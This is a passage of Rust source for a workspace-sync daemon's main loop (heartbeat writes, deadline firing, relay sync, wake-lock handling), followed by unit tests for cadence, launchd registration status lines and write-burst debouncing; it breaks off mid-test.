    let hb_path = home.heartbeat();
    // **What this service records as its own start is its process's `execve`, not this line** (nxf
    // 6j6v.d43g). `started_wall` above is this loop's wall-clock baseline and stays what it is; the
    // heartbeat's `started_at` is a different measurement that happened to share it, and sharing it
    // is what made a service look like somebody else's process for as long as it ran — the binary
    // sat behind a macOS permission dialog for 69 minutes between the two instants. `started_wall`
    // remains the fallback where the platform cannot answer.
    let started_at = to_rfc3339(heartbeat::recorded_start(std::process::id(), started_wall));
    // Per-workspace last-known outcome, carried across ticks (unlike `SweepReport`, which only
    // covers the workspaces THIS tick attempted) — what the heartbeat's `workspaces` list is
    // built from on every write.
    let mut health: HashMap<String, WorkspaceHealth> = HashMap::new();

    // A daemon must be visible to `status` from the moment it starts, not only once its first
    // pass completes: seeding the `Scheduler` to be immediately due (above) gets that first REAL
    // pass running right away, but this writes one heartbeat straight away too, before the loop
    // even starts, so there is never a window where the process is alive yet no heartbeat file
    // exists for `status` to read.
    // Resolved ONCE, before the loop: `current_exe()` cannot change under a running process, and
    // the answer is stamped into every heartbeat this service writes (nxf 6j6v.dcpk (a)).
    let program = nxs_service::program::running_program().map(|p| p.display().to_string());
    let version = Some(env!("CARGO_PKG_VERSION").to_string());
    // Which service this is (nxf 6j6v.gd9p) — read off the home this process already resolved, so
    // the heartbeat and the directory it is written into can never name different instances.
    let instance = Some(home.instance().name());
    let startup_hb = Heartbeat {
        pid: std::process::id(),
        started_at: started_at.clone(),
        last_pass_at: started_at.clone(),
        workspaces: Vec::new(),
        program: program.clone(),
        version: version.clone(),
        instance: instance.clone(),
        write_failures: None,
    };
    // **A service that cannot write its heartbeat keeps running** (nxf 6j6v.kcan) — see
    // [`WriteFailureLog`] for that decision and what it rests on. This is what stops the failure
    // being invisible: it is kept, and the next write that SUCCEEDS carries it, so a reader
    // looking at a gap learns it had a cause instead of concluding the service was down.
    let mut write_failures = WriteFailureLog::default();
    if let Err(e) = heartbeat::write_to(&hb_path, &startup_hb) {
        log_line(json, &format!("heartbeat write failed: {}", e.msg));
        write_failures.record(to_rfc3339(SystemTime::now()), e.msg.clone());
    }

    loop {
        let now = Instant::now();
        let wall = SystemTime::now();

        // A malformed `workspaces.toml` must not kill the loop (finding 4, final review): §5.6's
        // "a broken workspace never stops the sweep" contract extends to the sweep's own INPUT.
        // The registry is explicitly hand-editable (its own module doc), and under launchd's
        // `KeepAlive` a propagated error here used to mean a respawn every ~10s forever, into an
        // unrotated log — log it and skip straight to the next tick instead, exactly like every
        // per-workspace failure `sweep` itself already tolerates.
        let entries = match workspaces::load_registered() {
            Ok(entries) => entries,
            Err(e) => {
                log_line(json, &format!("reading the workspace registry: {}", e.msg));
                std::thread::sleep(TICK);
                continue;
            }
        };

        let (resolved, _stale) = resolve_registered(&entries);

        // Loaded fresh EVERY tick, not once before the loop (finding 3, final review): the
        // registry (above) and each workspace's own `sync.toml` (inside `sweep`) already work
        // this way. Hoisting this single read out of the loop meant a workspace with no
        // resolvable endpoint stayed stuck forever — the daemon's own remedy in its log line,
        // `nxs sync endpoint <url>`, changed nothing for a process that had already read the
        // file once at startup and would never look again. A read failure degrades to "no global
        // default this tick" rather than propagating, for the same launchd-respawn reason as the
        // registry read just above; a per-workspace override or a fixed file still works.
        let global = match super::endpoint::config_path()
            .and_then(|p| super::endpoint::load_global_from(&p))
        {
            Ok(global) => global,
            Err(e) => {
                log_line(json, &format!("reading the global sync config: {}", e.msg));
                None
            }
        };

        // The CLOCK, before the sync (6j6v.8see). Every tick, unconditionally: a declared window
        // that waited for the next due sync pass would be up to the safety-net interval late, and
        // a workspace with deadlines but no stream binding would never be looked at at all.
        // `reap` first, so a finished job's handle is released before another is started.
        clock.reap();
        let clock_report = fire_deadlines(&resolved, &to_rfc3339(wall), &clock);
        for (label, key) in &clock_report.fired {
            log_line(
                json,
                &format!("workspace {label}: deadline for {key} came due — started it"),
            );
        }
        for (label, msg) in &clock_report.errors {
            // A book that cannot be READ at all (malformed, or past the size ceiling) fails
            // identically on every tick, which without a dedup is one line a second forever. A
            // failed SPAWN is different — it is about one deadline that has already left the book —
            // so only the read failures are deduped, and they are the ones that carry the book's
            // own path in the message.
            let repeats = msg.contains("deadline book");
            if !repeats || state.warned_unrunnable.insert(label.clone()) {
                log_line(json, &format!("workspace {label}: {msg}"));
            }
        }
        for (label, count) in &clock_report.skipped {
            // Warn ONCE per workspace per run, exactly like the missing-endpoint line below: a
            // deadline this build will not run stays in the book, so without the dedup it would say
            // so every second for as long as the service lives.
            if state.warned_unrunnable.insert(label.clone()) {
                log_line(
                    json,
                    &format!(
                        "workspace {label}: {count} due deadline(s) name a job this build does not \
                         know, an id it will not run, or a stamp it cannot read — left in place"
                    ),
                );
            }
        }
        // NOT warn-once: a burst draining is progress, and an operator watching it wants each tick's
        // line. It is finite by construction — a book only shrinks as it fires.
        for (label, count) in &clock_report.deferred {
            log_line(
                json,
                &format!(
                    "workspace {label}: {count} deadline(s) came due beyond this tick's capacity — \
                     still armed, the next tick takes them"
                ),
            );
        }

        // Every tick, not only on a pass: a run can end at any second, and an assertion held on
        // after the last one is the failure direction that costs somebody their battery. Taking one
        // late costs a sleep; giving one back late costs days of never sleeping at all.
        match awake.want(a_run_is_alive(&resolved)) {
            nxs_service::WakeChange::Held => log_line(
                json,
                "a run is working — holding this machine awake until the last one ends",
            ),
            nxs_service::WakeChange::Released => log_line(
                json,
                "the last run has ended — this machine may sleep again",
            ),
            nxs_service::WakeChange::Refused(e) => log_line(
                json,
                &format!(
                    "could not keep this machine awake for a running job: {}",
                    e.msg
                ),
            ),
            nxs_service::WakeChange::Unchanged => {}
        }

        // The cheap question between passes (nxf 6j6v.1c6k): a chat written elsewhere reaches this
        // machine within seconds rather than at the next safety-net pass.
        peek(&mut state, now, &resolved, &RelayPeek, global.as_deref());
        let report = tick(&mut state, now, wall, &resolved, &pass, global.as_deref());
        // …and what arrived for THIS machine is picked up (nxf 6j6v.1c6k).
        if report.ran {
            let pickups = pick_up_owed(&report.synced, &resolved, &orders, &clock);
            for label in &pickups.started {
                log_line(
                    json,
                    &format!("workspace {label}: a chat this machine runs is owed a turn — picking it up"),
                );
            }
            for (label, msg) in &pickups.errors {
                log_line(
                    json,
                    &format!(
                        "workspace {label}: could not pick up the chats this machine runs: {msg}"
                    ),
                );
            }
        }

        // **Am I alone on these workspaces?** (nxf 6j6v.gd9p) Asked on a real PASS rather than on
        // every one-second tick — it reads `$HOME` and every sister's registry, and the answer only
        // changes when somebody binds — and warned about ONCE per workspace per run, exactly like
        // the two warn-once sets beside it. The service that is actually ticking a shared workspace
        // is the one whose word for it carries; `status` and `bind` say the same sentence.
        if report.ran {
            // Swallowed here for the reason the tick above makes true rather than assumes: this
            // loop already reads the same registry every tick through `workspaces::load_registered`
            // and logs a read failure loudly there, so propagating it a second time would say the
            // same thing twice (review of PR #395, Integrity #2).
            for shared in home.attended_by_more_than_one().unwrap_or_default() {
                if state.warned_shared.insert(shared.path.clone()) {
                    if let Some(note) =
                        nxs_service::shared_workspace_note(std::slice::from_ref(&shared))
                    {
                        log_line(json, &note);
                    }
                }
            }
        }

        for (label, msg) in &report.errors {
            log_line(json, &format!("workspace {label}: sync failed: {msg}"));
        }
        // The sync itself succeeded here (6j6v.8q88) — only the projection did not land, so this
        // is its own line and never touches the backoff. The file it failed to refresh is the one
        // `nxm doc --check` reports on, which is how a reader still finds out.
        for (label, msg) in &report.doc_errors {
            log_line(json, &doc_error_log_line(label, msg));
        }
        for label in &report.skipped_no_endpoint {
            log_line(
                json,
                &format!(
                    "workspace {label}: bound but no resolvable endpoint — set one with \
                     `nxs sync endpoint <url>` or `nxs sync bind --endpoint <url>`"
                ),
            );
        }
        // A pass that stopped at a limit is a CLEAN stop (the watermark is already at the resume
        // point, `report.errors` above stays empty for it), not a failure — but an operator
        // watching the log should still see it, and should be able to tell a draining backlog from
        // a relay that is answering with nothing at all (6j6v.25f6). The sentence comes from the
        // same builder `nxs sync run` prints, so the two cannot diverge.
        for (label, outcome) in &report.synced {
            if let Some(note) = super::stopped_early(outcome) {
                log_line(json, &format!("workspace {label}: {note}"));
            }
            if let Some(warning) = super::downgraded(outcome) {
                log_line(json, &format!("workspace {label}: {warning}"));
            }
            // The announcement's fate (6j6v.f0b5), from the shared builder so the sentence is
            // pinned by a test. An unsupported relay is said once per workspace per run.
            if let Some(note) = &outcome.presence {
                let first = matches!(note, PresenceNote::Unsupported)
                    && state.warned_no_presence.insert(label.clone());
                if let Some(line) = presence_log_line(label, note, first) {
                    log_line(json, &line);
                }
            }
        }

        // A real PASS ran this tick — as opposed to an idle 1s tick where nothing was due — is
        // exactly `report.ran` (task 12 DoD: the heartbeat is rewritten "after each pass", not
        // on every tick). This is `SweepReport`'s OWN signal, not inferred from its bucket
        // contents: an idle daemon with nothing registered yet still sweeps an EMPTY workspace
        // list on every due tick, and must still be visible to `status` as running.
        if report.ran {
            for (label, outcome) in &report.synced {
                health.insert(
                    label.clone(),
                    WorkspaceHealth {
                        path: label.clone(),
                        last_ok: Some(to_rfc3339(wall)),
                        last_error: None,
                        pushed: outcome.pushed as u64,
                        pulled: outcome.pulled as u64,
                    },
                );
            }
            for (label, msg) in &report.errors {
                let entry = health
                    .entry(label.clone())
                    .or_insert_with(|| WorkspaceHealth {
                        path: label.clone(),
                        last_ok: None,
                        last_error: None,
                        pushed: 0,
                        pulled: 0,
                    });
                entry.last_error = Some(msg.clone());
            }
            // Deterministic order (the project's CLI/output contract) — a `HashMap`'s own
            // iteration order is not.
            let mut workspaces_snapshot: Vec<WorkspaceHealth> = health.values().cloned().collect();
            workspaces_snapshot.sort_by(|a, b| a.path.cmp(&b.path));
            let hb = Heartbeat {
                pid: std::process::id(),
                started_at: started_at.clone(),
                last_pass_at: to_rfc3339(wall),
                workspaces: workspaces_snapshot,
                program: program.clone(),
                version: version.clone(),
                instance: instance.clone(),
                write_failures: write_failures.snapshot(),
            };
            // Best-effort: a heartbeat write failure (disk full, permissions) must not kill the
            // sync loop itself — syncing is the daemon's actual job, `status` visibility is
            // secondary to it. What is no longer secondary is SAYING so: the failure goes into the
            // tally above and rides out on the next successful write (nxf 6j6v.kcan).
            if let Err(e) = heartbeat::write_to(&hb_path, &hb) {
                log_line(json, &format!("heartbeat write failed: {}", e.msg));
                write_failures.record(to_rfc3339(wall), e.msg.clone());
            }
        }

        std::thread::sleep(TICK);
    }
}

#[cfg(test)]
mod service_pass_tests {
    use super::*;
    use nxs_sync::presence::{check_hello, online_window_secs, MAX_INTERVAL_SECS};

    #[test]
    fn the_cadence_a_service_announces_is_one_the_relay_accepts() {
        // Asked of the relay's own rule, not of a private field: a clamp that emitted exactly the
        // edge the relay refuses would otherwise stay green (review of PR #485, Test Quality #3).
        for interval in [
            0,
            1,
            20,
            299,
            300,
            1_200,
            MAX_INTERVAL_SECS,
            MAX_INTERVAL_SECS + 1,
            u64::MAX,
        ] {
            let cadence = announced_cadence(interval);
            let hello = MachineHello {
                machine_id: "01j8zqk7m2n4p6r8s0t2v4w6x8".into(),
                name: "MacBook".into(),
                interval_secs: cadence,
            };
            assert_eq!(
                check_hello(&hello),
                Ok(()),
                "--interval {interval} announces {cadence}"
            );
        }
    }

    #[test]
    fn a_service_never_promises_less_than_its_retry_backoff_nor_more_than_an_hour() {
        let backoff = BACKOFF_BASE.as_secs();
        assert_eq!(announced_cadence(0), backoff);
        assert_eq!(announced_cadence(20), backoff);
        assert_eq!(announced_cadence(300), 300);
        assert_eq!(announced_cadence(1_200), 1_200);
        assert_eq!(announced_cadence(u64::MAX), MAX_INTERVAL_SECS);
        let home = ServiceHome::at("/nonexistent-home-for-a-pure-test");
        assert_eq!(ServicePass::new(home, 20).interval_secs, backoff);
    }

    /// A pass that fails exactly once — its `fail_on`-th call — and succeeds otherwise.
    struct FailsOnce {
        calls: std::cell::Cell<u32>,
        fail_on: u32,
    }

    impl Pass for FailsOnce {
        fn run(&self, _ws: &Workspace, _endpoint: &str) -> Result<PassOutcome> {
            let n = self.calls.get() + 1;
            self.calls.set(n);
            if n == self.fail_on {
                return Err(NxfError::io("relay hiccup"));
            }
            Ok(PassOutcome::default())
        }
    }

    #[test]
    fn one_failed_pass_never_takes_a_live_machine_offline_at_any_cadence() {
        // The promise `nxs_sync::presence` makes — "the second interval absorbs one failed pass" —
        // proved against the daemon's own scheduler and backoff on a synthetic clock, not as
        // arithmetic. A failed pass announces nothing and is retried only after BACKOFF_BASE (a
        // fixed 300 s), so below ~240 s the interval alone could not keep that promise; the service
        // announces `max(interval, backoff)` instead (review of PR #485, Code Quality #6).
        for interval in [2u64, 20, 120, 300, 900] {
            let tmp = tempfile::TempDir::new().unwrap();
            let ws = nxs_foundation::workspace::setup(
                tmp.path(),
                &nxs_foundation::workspace::WorkspaceConfig::default(),
            )
            .unwrap();
            crate::sync::save(
                &ws,
                &crate::sync::SyncMeta {
                    stream_id: "s".into(),
                    endpoint: Some("http://relay.invalid".into()),
                    ..Default::default()
                },
            )
            .unwrap();
            let t0 = Instant::now();
            let w0 = SystemTime::UNIX_EPOCH + Duration::from_secs(1_000_000);
            let mut state = DaemonState::new(
                t0,
                w0,
                Duration::from_secs(interval),
                Duration::from_secs(2),
                Duration::from_secs(10),
                Duration::from_secs(30),
            );
            let pass = FailsOnce {
                calls: std::cell::Cell::new(0),
                fail_on: 3,
            };
            let mut announced_at = Vec::new();
            let horizon = 3 * interval + 3 * BACKOFF_BASE.as_secs();
            for sec in 0..horizon {
                let d = Duration::from_secs(sec);
                let report = tick(
                    &mut state,
                    t0 + d,
                    w0 + d,
                    std::slice::from_ref(&ws),
                    &pass,
                    None,
                );
                if !report.synced.is_empty() {
                    announced_at.push(sec);
                }
            }
            assert!(
                pass.calls.get() > 3,
                "--interval {interval}: the failure was passed and retried"
            );
            let worst = announced_at.windows(2).map(|w| w[1] - w[0]).max().unwrap();
            let window = online_window_secs(announced_cadence(interval));
            assert!(
                worst <= window,
                "--interval {interval}: two announcements {worst} s apart, but the window is {window} s"
            );
        }
    }

    #[test]
    fn what_the_service_says_about_an_announcement() {
        let failed = presence_log_line("/w/.nxs", &PresenceNote::Failed("boom".into()), false);
        assert_eq!(
            failed.as_deref(),
            Some("workspace /w/.nxs: synced, but this machine could not announce itself to the relay: boom")
        );
        let unsupported = presence_log_line("/w/.nxs", &PresenceNote::Unsupported, true);
        assert_eq!(
            unsupported.as_deref(),
            Some(
                "workspace /w/.nxs: the relay does not record which machines sync a stream (it \
                 predates machine presence, or a gateway in front of it does not route the \
                 presence path) — syncing is unaffected, but this machine will not appear in `nxs \
                 sync machines` until that changes"
            )
        );
        assert_eq!(
            presence_log_line("/w/.nxs", &PresenceNote::Unsupported, false),
            None,
            "said once per run, not every pass"
        );
        assert_eq!(
            presence_log_line("/w/.nxs", &PresenceNote::Recorded, true),
            None
        );
        for line in [failed.unwrap(), unsupported.unwrap()] {
            assert!(
                !line.contains("  "),
                "no run of spaces from a lost line continuation: {line:?}"
            );
        }
    }

    #[test]
    fn the_memory_projection_failure_line_reads_as_one_sentence() {
        let line = doc_error_log_line("/w/.nxs", "disk full");
        assert_eq!(
            line,
            "workspace /w/.nxs: synced, but NEXUS_MEMORY.md could not be regenerated: disk full"
        );
    }
}

#[cfg(test)]
mod tests {
    use nxs_service::heartbeat::WriteFailures;
    use nxs_service::ProgramState;

    // ---- what `status` says about each state (nxf 6j6v.kcan) ------------------------------------

    #[test]
    fn an_unconfirmable_service_is_reported_as_neither_running_nor_gone() {
        // THE DEFECT, in one assertion: this state used to render as "NOT running (stale heartbeat
        // — the process is gone)" about a process that was syncing, holding the machine awake and
        // reporting the end of its rounds. Somebody read that and reinstalled the service on top
        // of itself.
        let line = super::describe_state(super::ServiceState::Unconfirmed);
        assert!(
            !line.contains("the process is gone"),
            "the claim this state exists to stop making: {line}"
        );
        assert!(
            !line.starts_with("running"),
            "and it is not the older lie either: {line}"
        );
    }

    #[test]
    fn the_unconfirmed_line_names_the_one_thing_that_produces_it_and_what_to_do() {
        // It carried TWO readings until nxf 6j6v.d43g, because the check could not tell them
        // apart. It can now — by the direction of the disagreement — so the late-stamping service
        // reads as `running` and this line has one thing to say instead of a choice to offer.
        // Offering the choice anyway would send a reader looking for a hang that cannot be here.
        let line = super::describe_state(super::ServiceState::Unconfirmed);
        assert!(line.contains("handed on"), "the reused-id reading: {line}");
        assert!(
            !line.contains("stamped itself late"),
            "and no longer the reading that now reads as running: {line}"
        );
        assert!(
            line.contains("somebody else"),
            "whose process the reader is looking at, which is what stops them killing it: {line}"
        );
    }

    #[test]
    fn the_four_states_read_as_four_different_lines() {
        let lines = [
            super::describe_state(super::ServiceState::Running),
            super::describe_state(super::ServiceState::NotRunning),
            super::describe_state(super::ServiceState::Unconfirmed),
            super::describe_state(super::ServiceState::Unknown),
        ];
        for (i, a) in lines.iter().enumerate() {
            for b in &lines[i + 1..] {
                assert_ne!(a, b, "two states must never read the same");
            }
        }
    }

    // ---- What launchd holds, as `status` says it (nxf 6j6v.kvda) ----------------------------

    /// The verdict for the registration measured on this machine on 2026-09-04, read out of
    /// `launchctl print`'s own bytes by `nxs_service::launchd::parse_print`.
    fn the_poisoned_verdict() -> nxs_service::launchd::RegistrationVerdict {
        nxs_service::launchd::RegistrationVerdict::Foreign {
            loaded: PathBuf::from(
                "/private/var/folders/1k/zp26b2qx19xb7rr67crp3l1h0000gn/T/.tmpRblraz/Library/LaunchAgents/com.nxsflow.nexus-flow.plist",
            ),
            own: PathBuf::from("/Users/u/Library/LaunchAgents/com.nxsflow.nexus-flow.plist"),
            loaded_exists: false,
            program: None,
            state: Some("spawn scheduled".to_string()),
            last_exit_code: Some("78: EX_CONFIG".to_string()),
        }
    }

    /// **The acceptance point of 6j6v.kvda's second half.** The poisoned registration gets its own
    /// named answer — the TempDir path, the fact that it is gone, whose plist is being kept out,
    /// and what to run. Before this, `status` said "stale heartbeat — the process is gone": true,
    /// and it cost five days because it named no cause.
    #[test]
    fn a_registration_loaded_from_a_deleted_tempdir_gets_its_own_named_answer() {
        let line = super::describe_registration(&the_poisoned_verdict(), "com.nxsflow.nexus-flow");
        assert!(line.contains("FOREIGN"), "{line}");
        assert!(
            line.contains(".tmpRblraz"),
            "the path nobody could see: {line}"
        );
        assert!(line.contains("no longer exists"), "{line}");
        assert!(
            line.contains("/Users/u/Library/LaunchAgents/com.nxsflow.nexus-flow.plist"),
            "and the plist that is being kept out: {line}"
        );
        assert!(line.contains("78: EX_CONFIG"), "{line}");
        assert!(
            line.contains("nxs sync daemon install"),
            "and the cure: {line}"
        );
        assert!(
            !line.contains("stale heartbeat"),
            "this is its OWN answer, not a restatement of the one that said nothing: {line}"
        );
    }

    /// The two sentences a reader saw side by side on 2026-09-04 — and the whole difference this
    /// ticket makes: the state line was already true, and it was the registration line that was
    /// missing.
    #[test]
    fn the_state_line_and_the_registration_line_answer_two_different_questions() {
        let state = super::describe_state(super::ServiceState::NotRunning);
        let registration =
            super::describe_registration(&the_poisoned_verdict(), "com.nxsflow.nexus-flow");
        assert!(state.contains("stale heartbeat"), "{state}");
        assert!(
            !state.contains(".tmpRblraz") && registration.contains(".tmpRblraz"),
            "the cause belongs to the registration line and to nothing else"
        );
    }

    /// **The half-state of a failed install, as `status` reports it** (nxf 6j6v.0yrp, point 3).
    /// A heartbeat left by the process that is gone is not evidence of a service; the absence of a
    /// registration is evidence of its absence, and only this line carries it.
    #[test]
    fn a_label_launchd_holds_nothing_for_is_reported_as_nothing_loaded() {
        let line = super::describe_registration(
            &nxs_service::launchd::RegistrationVerdict::NotLoaded,
            "com.nxsflow.nexus-flow",
        );
        assert!(line.contains("NONE"), "{line}");
        assert!(
            line.contains("half-state"),
            "and it names the install that may have stopped there: {line}"
        );
        assert!(line.contains("nxs sync daemon install"), "{line}");
    }

    /// A healthy registration is one short line and no advice — the common case must not read like
    /// a warning.
    #[test]
    fn a_healthy_registration_is_one_line_that_asks_nothing_of_the_reader() {
        let line = super::describe_registration(
            &nxs_service::launchd::RegistrationVerdict::Ours {
                loaded: PathBuf::from("/h/Library/LaunchAgents/com.nxsflow.nexus-flow.plist"),
                state: Some("running".to_string()),
                program: Some(PathBuf::from("/h/.nexusflow/bin/nexus-flow")),
                program_is_ours: true,
                program_exists: true,
            },
            "com.nxsflow.nexus-flow",
        );
        assert!(line.contains("running"), "{line}");
        assert!(!line.contains("nxs sync daemon install"), "{line}");
    }

    /// Ours, and pointed at a binary that is gone: launchd will keep failing to start it forever,
    /// and its only report of that is a service that never runs.
    #[test]
    fn a_registration_naming_a_program_that_is_gone_says_which_program() {
        let line = super::describe_registration(
            &nxs_service::launchd::RegistrationVerdict::Ours {
                loaded: PathBuf::from("/h/Library/LaunchAgents/com.nxsflow.nexus-flow.plist"),
                state: Some("spawn scheduled".to_string()),
                program: Some(PathBuf::from("/gone/nexus-flow")),
                program_is_ours: true,
                program_exists: false,
            },
            "com.nxsflow.nexus-flow",
        );
        assert!(line.contains("/gone/nexus-flow"), "{line}");
        assert!(line.contains("does not exist"), "{line}");
    }

    /// "Nobody looked" never renders as "there is nothing" — the same tri-state discipline
    /// `running` and `shared_workspaces` already keep.
    #[test]
    fn an_unreadable_registration_is_never_reported_as_an_absent_one() {
        let unknown = super::describe_registration(
            &nxs_service::launchd::RegistrationVerdict::Unknown(
                "launchctl is not here".to_string(),
            ),
            "com.nxsflow.nexus-flow",
        );
        let none = super::describe_registration(
            &nxs_service::launchd::RegistrationVerdict::NotLoaded,
            "com.nxsflow.nexus-flow",
        );
        assert!(unknown.contains("UNKNOWN"), "{unknown}");
        assert!(
            unknown.contains("not the same as holding nothing"),
            "{unknown}"
        );
        assert_ne!(unknown, none);
    }

    /// Each arm renders the same keys, `null`s included, for the reason every block beside it does.
    #[test]
    fn the_registration_json_renders_the_same_keys_in_every_arm() {
        let arms = [
            nxs_service::launchd::RegistrationVerdict::NotLoaded,
            the_poisoned_verdict(),
            nxs_service::launchd::RegistrationVerdict::Unknown("x".to_string()),
            nxs_service::launchd::RegistrationVerdict::Ours {
                loaded: PathBuf::from("/h/Library/LaunchAgents/com.nxsflow.nexus-flow.plist"),
                state: None,
                program: None,
                program_is_ours: true,
                program_exists: true,
            },
        ];
        let keys: Vec<Vec<String>> = arms
            .iter()
            .map(|a| {
                let v = super::registration_json(a);
                let mut k: Vec<String> = v.as_object().unwrap().keys().cloned().collect();
                k.sort();
                k
            })
            .collect();
        for k in &keys {
            assert_eq!(k, &keys[0], "every arm renders the same keys: {keys:?}");
        }
        assert_eq!(super::registration_json(&arms[1])["verdict"], "foreign");
        assert!(super::registration_json(&arms[1])["loaded_from"]
            .as_str()
            .is_some_and(|s| s.contains(".tmpRblraz")));
    }

    /// The `ours` arm's VALUES, not only its keys (review of PR #428, Test Quality #3) — and with
    /// them the two `exists` questions the first cut folded into one ambiguous key.
    #[test]
    fn the_ours_arm_reports_the_plist_the_program_and_both_exists_questions_separately() {
        let v = super::registration_json(&nxs_service::launchd::RegistrationVerdict::Ours {
            loaded: PathBuf::from("/h/Library/LaunchAgents/com.nxsflow.nexus-flow.plist"),
            state: Some("running".to_string()),
            program: Some(PathBuf::from("/h/.nexusflow/bin/nexus-flow")),
            program_is_ours: true,
            program_exists: false,
        });
        assert_eq!(v["verdict"], "ours");
        assert_eq!(
            v["loaded_from"],
            "/h/Library/LaunchAgents/com.nxsflow.nexus-flow.plist"
        );
        assert_eq!(v["program"], "/h/.nexusflow/bin/nexus-flow");
        assert_eq!(v["state"], "running");
        // The two that used to share one key: launchd loaded it FROM our plist (so that was
        // there), and the program it names is NOT. Under one `exists` key a consumer could not
        // tell which of the two it was reading.
        assert_eq!(v["loaded_exists"], true);
        assert_eq!(v["program_exists"], false);
    }

    /// "Nobody looked" has more than one cause, and a fixed sentence that names only the likeliest
    /// is a guess dressed as an answer (review of PR #428, Code Quality #2).
    ///
    /// The gate's own refusal is fed through as the REAL message — built by
    /// `login_session_complaint` itself — so the prefix this classification matches on cannot drift
    /// into matching nothing.
    #[test]
    fn the_reason_nobody_looked_is_reported_rather_than_assumed() {
        let refusal = nxs_service::launchd::login_session_complaint(
            Path::new("/tmp/x"),
            Path::new("/Users/u"),
            501,
        )
        .expect("a mismatch is refused");
        let gate = super::not_checked_line(&refusal);
        assert!(gate.contains("not checked"), "{gate}");
        assert!(gate.contains("login session"), "{gate}");
        assert!(
            gate.contains("--allow-redirected-home"),
            "and the one move an operator with a redirected home has: {gate}"
        );
        assert!(
            !gate.contains("/tmp/x") && !gate.contains("/Users/u"),
            "the gate's sentence stays path-free, so every machine that reaches it reads the \
             same words: {gate}"
        );

        let other = super::not_checked_line("could not read the home directory of uid 501");
        assert!(
            other.contains("could not read the home directory"),
            "{other}"
        );
        assert_ne!(gate, other, "two causes must never read the same");
        assert!(
            !other.contains("login session"),
            "an unrelated failure is not blamed on the gate: {other}"
        );
    }

    /// A platform with no launchd has no question to leave unanswered — which is a different thing
    /// from an unanswered question, and prints nothing rather than a "not checked".
    #[test]
    fn no_launchd_means_no_line_rather_than_an_unanswered_one() {
        assert_eq!(
            super::registration_line(None, "com.nxsflow.nexus-flow"),
            None
        );
    }

    #[test]
    fn a_gap_in_the_heartbeat_is_reported_with_the_reason_it_had() {
        // The measured episode: the message went into a log nobody opens, and `status` — the one
        // place a person looks — said nothing about it.
        let line = super::describe_write_failures(&WriteFailures {
            count: 2,
            last_at: "2026-08-31T15:06:00Z".into(),
            last_error: "writing /Users/u/.nexusflow/sync-daemon.json: No space left on device \
                         (os error 28)"
                .into(),
        });
        assert!(line.contains('2'), "how many were missed: {line}");
        assert!(line.contains("2026-08-31T15:06:00Z"), "when: {line}");
        assert!(line.contains("No space left on device"), "and why: {line}");
    }

    #[test]
    fn a_dead_alias_is_named_with_its_target_and_the_command_that_fixes_it() {
        // The measured hazard (6j6v.dcpk): `link_program`'s own doc says launchd's only report of
        // this is a service that never starts, so `status` has to be the one that says it.
        let link = Path::new("/home/u/.nexusflow/bin/nexus-flow");
        let note = alias_note(
            &ProgramState::Dangling(PathBuf::from("/repo/target/debug/nxs")),
            link,
            Some("/repo/target/debug/nxs"),
        )
        .expect("a dead alias is always worth a note");
        assert!(note.contains("/home/u/.nexusflow/bin/nexus-flow"), "{note}");
        assert!(note.contains("/repo/target/debug/nxs"), "{note}");
        assert!(note.contains("nxs sync daemon install"), "{note}");
        assert_eq!(
            describe_alias(
                &ProgramState::Dangling(PathBuf::from("/repo/target/debug/nxs")),
                link
            ),
            "/home/u/.nexusflow/bin/nexus-flow -> /repo/target/debug/nxs (MISSING)"
        );
    }

    #[test]
    fn a_running_service_and_an_alias_that_have_drifted_apart_are_reported_as_two_builds() {
        // Fact 2 on the owner's machine: the process started 07:13 from one build, the link was
        // re-pointed at another at 22:51, and the next restart would have switched versions with
        // nobody deciding it.
        let link = Path::new("/home/u/.nexusflow/bin/nexus-flow");
        let note = alias_note(
            &ProgramState::Present(PathBuf::from("/home/u/.local/bin/nxs")),
            link,
            Some("/repo/target/debug/nxs"),
        )
        .expect("two different builds is exactly what this note is for");
        assert!(note.contains("/repo/target/debug/nxs"), "{note}");
        assert!(note.contains("/home/u/.local/bin/nxs"), "{note}");
        assert!(note.contains("next restart"), "{note}");
    }

    #[test]
    fn an_alias_that_agrees_with_the_running_service_says_nothing() {
        let link = Path::new("/home/u/.nexusflow/bin/nexus-flow");
        assert_eq!(
            alias_note(
                &ProgramState::Present(PathBuf::from("/home/u/.local/bin/nxs")),
                link,
                Some("/home/u/.local/bin/nxs"),
            ),
            None,
            "a note nobody needs is noise on every status call"
        );
        // A heartbeat from a service older than the field cannot be compared, so nothing is
        // claimed either way — the `program: unrecorded` line above says why.
        assert_eq!(
            alias_note(
                &ProgramState::Present(PathBuf::from("/home/u/.local/bin/nxs")),
                link,
                None,
            ),
            None
        );
        assert_eq!(alias_note(&ProgramState::Absent, link, None), None);
    }

    use super::*;

    fn scheduler(t0: Instant) -> Scheduler {
        Scheduler::new(
            t0,
            Duration::from_secs(300),
            Duration::from_secs(2),
            Duration::from_secs(10),
        )
    }

    #[test]
    fn a_write_burst_coalesces_into_exactly_one_push_pass() {
        // THE n4dn DoD: 20 writes over 3s must produce ONE pass, not 20.
        let t0 = Instant::now();
        let mut s = scheduler(t0);
        // A fresh `Scheduler` is due immediately at its own `now` (finding 2) — an orthogonal,
        // separately-pinned property (`a_fresh_scheduler_is_due_immediately_at_startup`).
        // Consuming it here establishes the steady state this test actually exercises: burst
        // debounce, not cold start.
        s.passed(t0);
        let mut passes = 0;
        for i in 0..20u64 {
            let now = t0 + Duration::from_millis(150 * i);
            s.on_trigger(Trigger::Nudge, now);
            if s.due(now) {
                passes += 1;
                s.passed(now);
            }
        }
        for i in 1..=30u64 {
            let now = t0 + Duration::from_millis(3000 + 100 * i);
            if s.due(now) {
                passes += 1;
                s.passed(now);
            }
        }
        assert_eq!(passes, 1, "a burst of 20 writes is ONE push pass");
    }

    #[test]
    fn a_continuous_write_stream_still_pushes_at_the_max_wait_ceiling() {
        // Without the ceiling, a nudge every 500ms would reset the 2s debounce forever and
        // the push would never happen (Yjs keystroke streams).
        let t0 = Instant::now();
        let mut s = scheduler(t0);
        // See the comment in `a_write_burst_coalesces_into_exactly_one_push_pass`: consume the
        // cold-start due-ness (finding 2) so this test measures the max-wait ceiling alone.
        s.passed(t0);
        let mut first = None;
        for i in 0..60u64 {
            let now = t0 + Duration::from_millis(500 * i);
            s.on_trigger(Trigger::Nudge, now);
            if s.due(now) {
                first.get_or_insert(now.duration_since(t0));
                s.passed(now);
            }
        }
        assert_eq!(first, Some(Duration::from_secs(10)));
    }

    #[test]
    fn wake_fires_immediately_and_does_not_wait_for_the_debounce() {
        let t0 = Instant::now();
        let mut s = scheduler(t0);
